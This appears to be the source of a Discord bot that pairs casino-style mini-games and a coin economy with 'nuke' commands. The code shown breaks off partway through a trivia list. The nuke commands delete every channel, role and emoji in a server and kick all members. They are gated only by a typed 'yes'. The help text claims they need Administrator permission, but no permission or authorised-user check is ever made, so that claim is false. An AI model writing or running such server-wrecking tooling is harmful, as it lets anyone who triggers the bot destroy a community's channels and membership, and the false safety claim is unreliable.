import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import random
import json
from datetime import datetime, timedelta

# ── Config ──────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
print(f"Token loaded: {BOT_TOKEN is not None}")
print(f"Token length: {len(BOT_TOKEN) if BOT_TOKEN else 0}")

AUTHORIZED_USER_IDS = [
    933543370935128204,
]

ECONOMY_FILE = "economy.json"
STARTING_BALANCE = 500
DAILY_AMOUNT = 100
DAILY_COOLDOWN_HOURS = 24

# ── Bot Setup ────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree

# ── Economy System ────────────────────────────────────────────────────────────
def load_economy():
    if os.path.exists(ECONOMY_FILE):
        with open(ECONOMY_FILE, "r") as f:
            return json.load(f)
    return {}

def save_economy(data):
    with open(ECONOMY_FILE, "w") as f:
        json.dump(data, f, indent=2)

def get_user_data(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": STARTING_BALANCE, "daily": None, "wins": 0, "losses": 0, "total_won": 0, "total_lost": 0}
        save_economy(data)
    return data[uid]

def get_balance(user_id):
    return get_user_data(user_id)["balance"]

def update_balance(user_id, amount):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": STARTING_BALANCE, "daily": None, "wins": 0, "losses": 0, "total_won": 0, "total_lost": 0}
    data[uid]["balance"] += amount
    if amount > 0:
        data[uid]["wins"] = data[uid].get("wins", 0) + 1
        data[uid]["total_won"] = data[uid].get("total_won", 0) + amount
    else:
        data[uid]["losses"] = data[uid].get("losses", 0) + 1
        data[uid]["total_lost"] = data[uid].get("total_lost", 0) + abs(amount)
    save_economy(data)
    return data[uid]["balance"]

def can_claim_daily(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data or data[uid].get("daily") is None:
        return True, None
    last = datetime.fromisoformat(data[uid]["daily"])
    remaining = timedelta(hours=DAILY_COOLDOWN_HOURS) - (datetime.utcnow() - last)
    if remaining.total_seconds() <= 0:
        return True, None
    return False, remaining

def claim_daily(user_id):
    data = load_economy()
    uid = str(user_id)
    if uid not in data:
        data[uid] = {"balance": STARTING_BALANCE, "daily": None, "wins": 0, "losses": 0, "total_won": 0, "total_lost": 0}
    data[uid]["balance"] += DAILY_AMOUNT
    data[uid]["daily"] = datetime.utcnow().isoformat()
    save_economy(data)
    return data[uid]["balance"]

def get_leaderboard():
    data = load_economy()
    sorted_users = sorted(data.items(), key=lambda x: x[1]["balance"], reverse=True)
    return sorted_users[:10]

# ── Helpers ───────────────────────────────────────────────────────────────────
async def confirm(ctx, action: str) -> bool:
    embed = discord.Embed(
        title="⚠️ Confirm Nuke",
        description=f"Are you sure you want to **{action}**?\n\nType `yes` to confirm or `no` to cancel.",
        color=discord.Color.red(),
    )
    await ctx.send(embed=embed)

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ["yes", "no"]

    try:
        reply = await bot.wait_for("message", timeout=15.0, check=check)
        return reply.content.lower() == "yes"
    except asyncio.TimeoutError:
        await ctx.send("⏱️ Confirmation timed out. Nuke cancelled.")
        return False

async def send_result(ctx, results: list[str]):
    embed = discord.Embed(title="💥 Nuke Complete", description="\n".join(results), color=discord.Color.orange())
    await ctx.send(embed=embed)

# ── Nuke Commands ──────────────────────────────────────────────────────────────
@bot.command(name="nuke_channels")
async def nuke_channels(ctx):
    if not await confirm(ctx, "delete ALL channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="Nuke: channels")
            count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuke complete. Deleted **{count}** channels.")
    except Exception:
        pass

@bot.command(name="nuke_roles")
async def nuke_roles(ctx):
    if not await confirm(ctx, "delete all roles"):
        return
    guild = ctx.guild
    count = 0
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: roles")
            count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await send_result(ctx, [f"🗑️ Deleted **{count}** roles."])

@bot.command(name="nuke_channels_roles")
async def nuke_channels_roles(ctx):
    if not await confirm(ctx, "delete all channels AND roles"):
        return
    guild = ctx.guild
    ch_count = role_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: channels+roles")
            ch_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: channels+roles")
            role_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuked **{ch_count}** channels and **{role_count}** roles.")
    except Exception:
        pass

@bot.command(name="nuke_kick")
async def nuke_kick(ctx):
    if not await confirm(ctx, "delete channels, roles, AND kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: kick")
            ch_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: kick")
            role_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: kick all")
            kick_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuked: **{ch_count}** channels, **{role_count}** roles, **{kick_count}** members kicked.")
    except Exception:
        pass

@bot.command(name="nuke_full")
async def nuke_full(ctx):
    if not await confirm(ctx, "FULL RESET — channels, roles, emojis, and kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = emoji_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: full reset")
            ch_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: full reset")
            role_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason="Nuke: full reset")
            emoji_count += 1
            await asyncio.sleep(0.005)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: full reset")
            kick_count += 1
            await asyncio.sleep(0.1)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(
            f"💥 **Full Nuke Complete**\n🗑️ Channels: {ch_count}\n🎭 Roles: {role_count}\n😀 Emojis: {emoji_count}\n👢 Members kicked: {kick_count}"
        )
    except Exception:
        pass

@bot.command(name="nuke_help")
async def nuke_help(ctx):
    embed = discord.Embed(title="💥 Nuke Bot Commands", color=discord.Color.red())
    embed.add_field(name="!nuke_channels", value="Delete all channels", inline=False)
    embed.add_field(name="!nuke_roles", value="Delete all non-default roles", inline=False)
    embed.add_field(name="!nuke_channels_roles", value="Delete all channels and roles", inline=False)
    embed.add_field(name="!nuke_kick", value="Delete channels, roles, and kick all members", inline=False)
    embed.add_field(name="!nuke_full", value="Full reset: channels, roles, emojis, kick members", inline=False)
    embed.set_footer(text="⚠️ Requires Administrator permission. All actions ask for confirmation.")
    await ctx.send(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 💰 ECONOMY COMMANDS
# ══════════════════════════════════════════════════════════════════════════════

@tree.command(name="balance", description="Check your balance and stats!")
async def balance(interaction: discord.Interaction):
    user_data = get_user_data(interaction.user.id)
    bal = user_data["balance"]
    wins = user_data.get("wins", 0)
    losses = user_data.get("losses", 0)
    total_won = user_data.get("total_won", 0)
    total_lost = user_data.get("total_lost", 0)
    winrate = round((wins / (wins + losses)) * 100, 1) if (wins + losses) > 0 else 0

    embed = discord.Embed(title=f"💰 {interaction.user.display_name}'s Wallet", color=discord.Color.green())
    embed.set_thumbnail(url=interaction.user.display_avatar.url)
    embed.add_field(name="💵 Balance", value=f"**${bal:,}**", inline=True)
    embed.add_field(name="📈 Win Rate", value=f"**{winrate}%**", inline=True)
    embed.add_field(name="🏆 Wins", value=f"**{wins}**", inline=True)
    embed.add_field(name="💔 Losses", value=f"**{losses}**", inline=True)
    embed.add_field(name="💸 Total Won", value=f"**${total_won:,}**", inline=True)
    embed.add_field(name="🔥 Total Lost", value=f"**${total_lost:,}**", inline=True)
    await interaction.response.send_message(embed=embed)

@tree.command(name="daily", description="Claim your daily $100!")
async def daily(interaction: discord.Interaction):
    can_claim, remaining = can_claim_daily(interaction.user.id)
    if can_claim:
        new_bal = claim_daily(interaction.user.id)
        embed = discord.Embed(
            title="💸 Daily Reward Claimed!",
            description=f"You claimed **${DAILY_AMOUNT}**!\n\n💰 New balance: **${new_bal:,}**\n\n_Come back in 24 hours for your next reward!_",
            color=discord.Color.green()
        )
        embed.set_thumbnail(url=interaction.user.display_avatar.url)
    else:
        hours, remainder = divmod(int(remaining.total_seconds()), 3600)
        minutes = remainder // 60
        embed = discord.Embed(
            title="⏱️ Already Claimed!",
            description=f"You already claimed your daily reward.\n\nCome back in **{hours}h {minutes}m**!",
            color=discord.Color.red()
        )
    await interaction.response.send_message(embed=embed)

@tree.command(name="leaderboard", description="See the richest players!")
async def leaderboard(interaction: discord.Interaction):
    top = get_leaderboard()
    embed = discord.Embed(title="🏆 Richest Players", color=discord.Color.gold())
    medals = ["🥇", "🥈", "🥉"]
    description = ""
    for i, (uid, info) in enumerate(top):
        medal = medals[i] if i < 3 else f"**#{i+1}**"
        try:
            user = await bot.fetch_user(int(uid))
            name = user.display_name
        except:
            name = f"User {uid}"
        winrate = round((info.get("wins", 0) / max(info.get("wins", 0) + info.get("losses", 0), 1)) * 100, 1)
        description += f"{medal} **{name}** — ${info['balance']:,} _(WR: {winrate}%)_\n"
    embed.description = description or "No players yet!"
    embed.set_footer(text="Play games to earn money and climb the leaderboard!")
    await interaction.response.send_message(embed=embed)

@tree.command(name="give", description="Give money to another player!")
@app_commands.describe(user="Who to give money to", amount="How much to give")
async def give(interaction: discord.Interaction, user: discord.Member, amount: int):
    if user == interaction.user:
        await interaction.response.send_message("❌ You can't give money to yourself!", ephemeral=True)
        return
    if amount <= 0:
        await interaction.response.send_message("❌ Amount must be more than $0!", ephemeral=True)
        return
    bal = get_balance(interaction.user.id)
    if amount > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return
    update_balance(interaction.user.id, -amount)
    update_balance(user.id, amount)
    embed = discord.Embed(
        title="💸 Money Sent!",
        description=f"{interaction.user.mention} sent **${amount:,}** to {user.mention}!",
        color=discord.Color.green()
    )
    embed.add_field(name="Your new balance", value=f"**${get_balance(interaction.user.id):,}**", inline=True)
    await interaction.response.send_message(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 🎮 INTERACTIVE GAMES
# ══════════════════════════════════════════════════════════════════════════════

# ── 🎰 SLOTS ──────────────────────────────────────────────────────────────────
class SlotsView(discord.ui.View):
    def __init__(self, user, bet):
        super().__init__(timeout=60)
        self.user = user
        self.bet = bet
        self.spins_left = 3

    def spin_reels(self):
        symbols = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "7️⃣"]
        weights = [30, 25, 20, 15, 6, 3, 1]
        return random.choices(symbols, weights=weights, k=3)

    def calculate_win(self, reels):
        if reels[0] == reels[1] == reels[2]:
            multipliers = {"💎": 20, "7️⃣": 15, "⭐": 10}
            return multipliers.get(reels[0], 5), True
        elif reels[0] == reels[1] or reels[1] == reels[2] or reels[0] == reels[2]:
            return 1, False
        return 0, False

    def build_embed(self, reels, result_text, color):
        embed = discord.Embed(title="🎰 Slot Machine", color=color)
        embed.add_field(name="Reels", value=f"# {' | '.join(reels)}", inline=False)
        embed.add_field(name="Result", value=result_text, inline=False)
        embed.add_field(name="Bet", value=f"**${self.bet:,}**", inline=True)
        embed.add_field(name="Spins Left", value=f"**{self.spins_left}**", inline=True)
        embed.add_field(name="Balance", value=f"**${get_balance(self.user.id):,}**", inline=True)
        embed.set_footer(text="Use your free spins wisely!")
        return embed

    @discord.ui.button(label="🎰 Spin!", style=discord.ButtonStyle.green)
    async def spin(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return

        reels = self.spin_reels()
        multiplier, jackpot = self.calculate_win(reels)
        self.spins_left -= 1

        if multiplier > 1:
            winnings = self.bet * multiplier
            new_bal = update_balance(self.user.id, winnings)
            if jackpot:
                result = f"🎉 **JACKPOT! {multiplier}x!** You won **${winnings:,}**!"
                color = discord.Color.gold()
            else:
                result = f"🎊 **{multiplier}x multiplier!** You won **${winnings:,}**!"
                color = discord.Color.green()
        elif multiplier == 1:
            result = f"😐 **Two of a kind!** Bet returned **${self.bet:,}**"
            color = discord.Color.yellow()
        else:
            new_bal = update_balance(self.user.id, -self.bet)
            result = f"❌ **No match!** Lost **${self.bet:,}**"
            color = discord.Color.red()

        if self.spins_left <= 0 or get_balance(self.user.id) < self.bet:
            button.disabled = True
            self.stop()

        embed = self.build_embed(reels, result, color)
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="💰 Cash Out", style=discord.ButtonStyle.red)
    async def cash_out(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        embed = discord.Embed(
            title="🎰 Cashed Out!",
            description=f"Thanks for playing! Your balance: **${get_balance(self.user.id):,}**",
            color=discord.Color.blue()
        )
        self.stop()
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="slots", description="Spin the slot machine!")
@app_commands.describe(bet="Amount to bet per spin (default: 10)")
async def slots(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    view = SlotsView(interaction.user, bet)
    embed = discord.Embed(title="🎰 Slot Machine", color=discord.Color.blue())
    embed.add_field(name="💵 Bet", value=f"**${bet:,}** per spin", inline=True)
    embed.add_field(name="🔄 Free Spins", value="**3**", inline=True)
    embed.add_field(name="💰 Balance", value=f"**${bal:,}**", inline=True)
    embed.add_field(name="Payouts", value="💎 = 20x | 7️⃣ = 15x | ⭐ = 10x\n🍇 = 5x | Two of a kind = return bet", inline=False)
    embed.set_footer(text="Press Spin to start!")
    await interaction.response.send_message(embed=embed, view=view)


# ── 🪨 ROCK PAPER SCISSORS (Best of 3) ────────────────────────────────────────
class RPSView(discord.ui.View):
    def __init__(self, user, bet):
        super().__init__(timeout=60)
        self.user = user
        self.bet = bet
        self.player_wins = 0
        self.bot_wins = 0
        self.round = 1
        self.max_rounds = 3

    def play_round(self, choice):
        options = ["rock", "paper", "scissors"]
        emojis = {"rock": "🪨", "paper": "📄", "scissors": "✂️"}
        bot_choice = random.choice(options)

        if choice == bot_choice:
            outcome = "tie"
        elif (choice == "rock" and bot_choice == "scissors") or \
             (choice == "paper" and bot_choice == "rock") or \
             (choice == "scissors" and bot_choice == "paper"):
            outcome = "win"
            self.player_wins += 1
        else:
            outcome = "loss"
            self.bot_wins += 1

        return emojis[choice], emojis[bot_choice], outcome

    def build_embed(self, player_emoji, bot_emoji, outcome, round_result):
        color = discord.Color.green() if outcome == "win" else discord.Color.red() if outcome == "loss" else discord.Color.yellow()
        embed = discord.Embed(title=f"🪨 Rock Paper Scissors — Round {self.round - 1}/{self.max_rounds}", color=color)
        embed.add_field(name="Your pick", value=player_emoji, inline=True)
        embed.add_field(name="Bot's pick", value=bot_emoji, inline=True)
        embed.add_field(name="Round", value=round_result, inline=True)
        embed.add_field(name="Score", value=f"You **{self.player_wins}** — Bot **{self.bot_wins}**", inline=False)
        embed.add_field(name="Bet", value=f"**${self.bet:,}**", inline=True)
        embed.add_field(name="Balance", value=f"**${get_balance(self.user.id):,}**", inline=True)
        return embed

    async def handle_choice(self, interaction, choice):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return

        player_emoji, bot_emoji, outcome = self.play_round(choice)
        self.round += 1

        round_result = "🎉 You win this round!" if outcome == "win" else "❌ Bot wins this round!" if outcome == "loss" else "🤝 Tie!"
        embed = self.build_embed(player_emoji, bot_emoji, outcome, round_result)

        game_over = self.round > self.max_rounds or self.player_wins == 2 or self.bot_wins == 2

        if game_over:
            for child in self.children:
                child.disabled = True
            self.stop()

            if self.player_wins > self.bot_wins:
                new_bal = update_balance(self.user.id, self.bet * 2)
                embed.add_field(name="🏆 GAME OVER", value=f"**You won the match! +${self.bet * 2:,}**\nNew balance: **${new_bal:,}**", inline=False)
                embed.color = discord.Color.gold()
            elif self.bot_wins > self.player_wins:
                new_bal = update_balance(self.user.id, -self.bet)
                embed.add_field(name="💔 GAME OVER", value=f"**Bot wins the match! -${self.bet:,}**\nNew balance: **${new_bal:,}**", inline=False)
                embed.color = discord.Color.red()
            else:
                embed.add_field(name="🤝 GAME OVER", value=f"**It's a draw! Bet returned.**\nBalance: **${get_balance(self.user.id):,}**", inline=False)

        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="🪨 Rock", style=discord.ButtonStyle.grey)
    async def rock(self, interaction, button):
        await self.handle_choice(interaction, "rock")

    @discord.ui.button(label="📄 Paper", style=discord.ButtonStyle.blurple)
    async def paper(self, interaction, button):
        await self.handle_choice(interaction, "paper")

    @discord.ui.button(label="✂️ Scissors", style=discord.ButtonStyle.red)
    async def scissors(self, interaction, button):
        await self.handle_choice(interaction, "scissors")

@tree.command(name="rps", description="Play Best of 3 Rock Paper Scissors!")
@app_commands.describe(bet="Amount to bet (default: 10)")
async def rps(interaction: discord.Interaction, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    view = RPSView(interaction.user, bet)
    embed = discord.Embed(title="🪨 Rock Paper Scissors — Best of 3!", color=discord.Color.blue())
    embed.add_field(name="💵 Bet", value=f"**${bet:,}**", inline=True)
    embed.add_field(name="🏆 Win", value=f"**+${bet * 2:,}**", inline=True)
    embed.add_field(name="💔 Lose", value=f"**-${bet:,}**", inline=True)
    embed.add_field(name="Rules", value="Win 2 out of 3 rounds to take the prize!\nTied rounds don't count.", inline=False)
    embed.set_footer(text="Choose your weapon!")
    await interaction.response.send_message(embed=embed, view=view)


# ── 🎱 8 BALL ─────────────────────────────────────────────────────────────────
class EightBallView(discord.ui.View):
    def __init__(self, user, question, bet):
        super().__init__(timeout=30)
        self.user = user
        self.question = question
        self.bet = bet

    @discord.ui.button(label="🎱 Reveal Answer", style=discord.ButtonStyle.blurple)
    async def reveal(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return

        positive = ["✅ It is certain.", "✅ It is decidedly so.", "✅ Without a doubt.", "✅ Yes, definitely.", "✅ You may rely on it.", "✅ As I see it, yes.", "✅ Most likely.", "✅ Outlook good.", "✅ Yes.", "✅ Signs point to yes."]
        neutral = ["🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.", "🤷 Cannot predict now.", "🤷 Concentrate and ask again."]
        negative = ["❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.", "❌ Outlook not so good.", "❌ Very doubtful."]

        answer = random.choice(positive + neutral + negative)

        if answer in positive:
            winnings = self.bet * 2
            new_bal = update_balance(self.user.id, winnings)
            result = f"🎉 **YES answer!** You win **${winnings:,}**!"
            color = discord.Color.green()
        elif answer in neutral:
            new_bal = get_balance(self.user.id)
            result = f"🤷 **Neutral!** Bet returned."
            color = discord.Color.yellow()
        else:
            new_bal = update_balance(self.user.id, -self.bet)
            result = f"❌ **NO answer!** Lost **${self.bet:,}**!"
            color = discord.Color.red()

        embed = discord.Embed(title="🎱 The Magic 8 Ball Speaks...", color=color)
        embed.add_field(name="❓ Your Question", value=self.question, inline=False)
        embed.add_field(name="🎱 The Answer", value=f"**{answer}**", inline=False)
        embed.add_field(name="💰 Result", value=result, inline=False)
        embed.add_field(name="💵 Balance", value=f"**${new_bal:,}**", inline=True)

        button.disabled = True
        self.stop()
        await interaction.response.edit_message(embed=embed, view=self)

    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.red)
    async def cancel(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return
        embed = discord.Embed(title="🎱 8 Ball Cancelled", description="The spirits were not consulted.", color=discord.Color.grey())
        self.stop()
        for child in self.children:
            child.disabled = True
        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="8ball", description="Ask the magic 8 ball and bet on a YES answer!")
@app_commands.describe(question="Your yes/no question", bet="Amount to bet (default: 10)")
async def eightball(interaction: discord.Interaction, question: str, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    view = EightBallView(interaction.user, question, bet)
    embed = discord.Embed(title="🎱 Magic 8 Ball", color=discord.Color.dark_purple())
    embed.add_field(name="❓ Question", value=question, inline=False)
    embed.add_field(name="💵 Bet", value=f"**${bet:,}** on a YES answer", inline=True)
    embed.add_field(name="🏆 Win", value=f"**+${bet * 2:,}**", inline=True)
    embed.add_field(name="🤷 Neutral", value="Bet returned", inline=True)
    embed.add_field(name="❌ Lose", value=f"**-${bet:,}**", inline=True)
    embed.set_footer(text="Press Reveal Answer when you're ready...")
    await interaction.response.send_message(embed=embed, view=view)


# ── 🎲 DICE ───────────────────────────────────────────────────────────────────
class DiceView(discord.ui.View):
    def __init__(self, user, bet, sides):
        super().__init__(timeout=60)
        self.user = user
        self.bet = bet
        self.sides = sides
        self.rounds_left = 3
        self.player_score = 0
        self.bot_score = 0

    @discord.ui.button(label="🎲 Roll!", style=discord.ButtonStyle.green)
    async def roll(self, interaction, button):
        if interaction.user != self.user:
            await interaction.response.send_message("❌ This isn't your game!", ephemeral=True)
            return

        player_roll = random.randint(1, self.sides)
        bot_roll = random.randint(1, self.sides)
        self.rounds_left -= 1

        if player_roll > bot_roll:
            self.player_score += 1
            round_result = f"🎉 You win this roll! (**{player_roll}** vs **{bot_roll}**)"
            color = discord.Color.green()
        elif bot_roll > player_roll:
            self.bot_score += 1
            round_result = f"❌ Bot wins this roll! (**{player_roll}** vs **{bot_roll}**)"
            color = discord.Color.red()
        else:
            round_result = f"🤝 Tie! (**{player_roll}** vs **{bot_roll}**)"
            color = discord.Color.yellow()

        embed = discord.Embed(title=f"🎲 Dice Duel (d{self.sides})", color=color)
        embed.add_field(name="🎲 This Roll", value=round_result, inline=False)
        embed.add_field(name="📊 Score", value=f"You **{self.player_score}** — Bot **{self.bot_score}**", inline=True)
        embed.add_field(name="🔄 Rolls Left", value=f"**{self.rounds_left}**", inline=True)
        embed.add_field(name="💵 Bet", value=f"**${self.bet:,}**", inline=True)

        if self.rounds_left <= 0:
            button.disabled = True
            self.stop()
            if self.player_score > self.bot_score:
                new_bal = update_balance(self.user.id, self.bet * 2)
                embed.add_field(name="🏆 GAME OVER", value=f"**You win! +${self.bet * 2:,}**\nBalance: **${new_bal:,}**", inline=False)
                embed.color = discord.Color.gold()
            elif self.bot_score > self.player_score:
                new_bal = update_balance(self.user.id, -self.bet)
                embed.add_field(name="💔 GAME OVER", value=f"**Bot wins! -${self.bet:,}**\nBalance: **${new_bal:,}**", inline=False)
                embed.color = discord.Color.red()
            else:
                embed.add_field(name="🤝 GAME OVER", value=f"**Draw! Bet returned.**\nBalance: **${get_balance(self.user.id):,}**", inline=False)

        await interaction.response.edit_message(embed=embed, view=self)

@tree.command(name="dice", description="Play a 3-round Dice Duel!")
@app_commands.describe(sides="Number of sides on the dice (default: 6)", bet="Amount to bet (default: 10)")
async def dice(interaction: discord.Interaction, sides: int = 6, bet: int = 10):
    bal = get_balance(interaction.user.id)
    if sides < 2 or sides > 100:
        await interaction.response.send_message("❌ Sides must be between 2 and 100!", ephemeral=True)
        return
    if bet <= 0:
        await interaction.response.send_message("❌ Bet must be more than $0!", ephemeral=True)
        return
    if bet > bal:
        await interaction.response.send_message(f"❌ You only have **${bal:,}**!", ephemeral=True)
        return

    view = DiceView(interaction.user, bet, sides)
    embed = discord.Embed(title=f"🎲 Dice Duel — d{sides}", color=discord.Color.blue())
    embed.add_field(name="💵 Bet", value=f"**${bet:,}**", inline=True)
    embed.add_field(name="🔄 Rounds", value="**3**", inline=True)
    embed.add_field(name="🏆 Win", value=f"**+${bet * 2:,}**", inline=True)
    embed.add_field(name="Rules", value=f"Roll a d{sides} against the bot 3 times.\nHighest score after 3 rounds wins!", inline=False)
    embed.set_footer(text="Press Roll to start!")
    await interaction.response.send_message(embed=embed, view=view)


# ── ❓ TRIVIA ─────────────────────────────────────────────────────────────────
TRIVIA_QUESTIONS = {
    "easy": [
        {"q": "What is the capital of France?", "a": "paris", "reward": 50},
        {"q": "How many sides does a hexagon have?", "a": "6", "reward": 50},
        {"q": "What color is the sky on a clear day?", "a": "blue", "reward": 50},
        {"q": "How many legs does a spider have?", "a": "8", "reward": 50},
        {"q": "What is the largest planet in our solar system?", "a": "jupiter", "reward": 50},
        {"q": "What is the capital of Japan?", "a": "tokyo", "reward": 50},
        {"q": "How many continents are there?", "a": "7", "reward": 50},
        {"q": "What is the fastest land animal?", "a": "cheetah", "reward": 50},
        {"q": "What planet is known as the Red Planet?", "a": "mars", "reward": 50},
        {"q": "What is 7 x 8?", "a": "56", "reward": 50},

        {"q": "What is the capital of Italy?", "a": "rome", "reward": 50},
        {"q": "How many days are in a week?", "a": "7", "reward": 50},
        {"q": "What color are bananas?", "a": "yellow", "reward": 50},
        {"q": "What do bees make?", "a": "honey", "reward": 50},
        {"q": "What is 10 + 5?", "a": "15", "reward": 50},
        {"q": "What is the opposite of hot?", "a": "cold", "reward": 50},
        {"q": "What shape has three sides?", "a": "triangle", "reward": 50},
        {"q": "What is the capital of the United States?", "a": "washington dc", "reward": 50},
        {"q": "What ocean is on the east coast of the United States?", "a": "atlantic", "reward": 50},
        {"q": "How many hours are in a day?", "a": "24", "reward": 50},
        {"q": "What animal says 'meow'?", "a": "cat", "reward": 50},
        {"q": "What is 9 + 1?", "a": "10", "reward": 50},
        {"q": "What color is grass?", "a": "green", "reward": 50},
        {"q": "What is frozen water called?", "a": "ice", "reward": 50},
        {"q": "How many fingers are on one hand?", "a": "5", "reward": 50},
        {"q": "What is the capital of Canada?", "a": "ottawa", "reward": 50},
        {"q": "What do cows drink?", "a": "water", "reward": 50},
        {"q": "What is 5 x 5?", "a": "25", "reward": 50},
        {"q": "What is the color of snow?", "a": "white", "reward": 50},
        {"q": "What animal barks?", "a": "dog", "reward": 50},
        {"q": "How many wheels does a bicycle have?", "a": "2", "reward": 50},
        {"q": "What is the first letter of the alphabet?", "a": "a", "reward": 50},
        {"q": "What fruit is red and often associated with doctors?", "a": "apple", "reward": 50},
        {"q": "What is 2 + 2?", "a": "4", "reward": 50},
        {"q": "What is the capital of Spain?", "a": "madrid", "reward": 50},
    ],

    "medium": [
        {"q": "What is the chemical symbol for water?", "a": "h2o", "reward": 150},
        {"q": "What is the square root of 144?", "a": "12", "reward": 150},
        {"q": "Who painted the Mona Lisa?", "a": "da vinci", "reward": 150},
        {"q": "What is the smallest prime number?", "a": "2", "reward": 150},
        {"q": "What element has the symbol Au?", "a": "gold", "reward": 150},
        {"q": "What year did World War II end?", "a": "1945", "reward": 150},
        {"q": "How many players are on a basketball team on the court?", "a": "5", "reward": 150},
        {"q": "What is the largest ocean on Earth?", "a": "pacific", "reward": 150},

        {"q": "Who wrote 'Romeo and Juliet'?", "a": "shakespeare", "reward": 150},
        {"q": "What gas do plants absorb from the atmosphere?", "a": "carbon dioxide", "reward": 150},
        {"q": "What is the capital of Australia?", "a": "canberra", "reward": 150},
        {"q": "How many degrees are in a right angle?", "a": "90", "reward": 150},
        {"q": "What is the boiling point of water in celsius?", "a": "100", "reward": 150},
        {"q": "Who discovered gravity (falling apple story)?", "a": "newton", "reward": 150},
        {"q": "What is the hardest natural substance?", "a": "diamond", "reward": 150},
        {"q": "What is the capital of Germany?", "a": "berlin", "reward": 150},
        {"q": "What is 15 x 3?", "a": "45", "reward": 150},
        {"q": "Which planet has rings?", "a": "saturn", "reward": 150},
        {"q": "What language is primarily spoken in Brazil?", "a": "portuguese", "reward": 150},
        {"q": "How many bones are in an adult human hand?", "a": "27", "reward": 150},
        {"q": "What is the largest desert in the world?", "a": "antarctica", "reward": 150},
        {"q": "What organ pumps blood through the body?", "a": "heart", "reward": 150},
        {"q": "What is the capital of India?", "a": "new delhi", "reward": 150},
        {"q": "What is the freezing point of water in celsius?", "a": "0", "reward": 150},
